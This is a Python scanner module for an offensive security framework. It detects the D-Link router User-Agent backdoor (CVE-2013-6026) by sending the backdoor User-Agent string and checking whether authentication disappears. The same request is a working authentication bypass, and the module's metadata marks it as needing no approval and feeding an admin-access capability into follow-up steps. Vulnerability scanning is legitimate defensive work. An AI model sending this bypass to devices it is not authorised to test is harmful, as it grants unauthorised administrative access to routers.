#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link string-reversed User-Agent backdoor (CVE-2013-6026)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'D-Link - User-Agent Backdoor Detection (CVE-2013-6026)',
        'description': (
            'Detects CVE-2013-6026 by comparing unauthorized responses with and without '
            'User-Agent xmlset_roodkcableoj28840ybtide on thttpd-alphanetworks.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2013', 'dlink', 'backdoor', 'auth-bypass', 'iot', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2013-6026',
        ],
        'cve': 'CVE-2013-6026',
    }

    def run(self):
        r0 = self.http_request(method='GET', path='/', allow_redirects=False)
        if not r0:
            return False
        # first response should require auth / redirect
        if r0.status_code not in (401, 302) and 'self.location.href' not in (r0.text or ''):
            return False
        r1 = self.http_request(
            method='GET',
            path='/',
            headers={'User-Agent': 'xmlset_roodkcableoj28840ybtide'},
            allow_redirects=False,
        )
        if not r1:
            return False
        body1 = r1.text or ''
        # Bypass confirmed only when auth wall disappears (200 without login redirect JS).
        if r1.status_code == 200 and 'self.location.href' not in body1:
            self.set_info(
                severity='critical',
                reason='D-Link User-Agent backdoor (CVE-2013-6026)',
                path='/',
            )
            return True
        return False
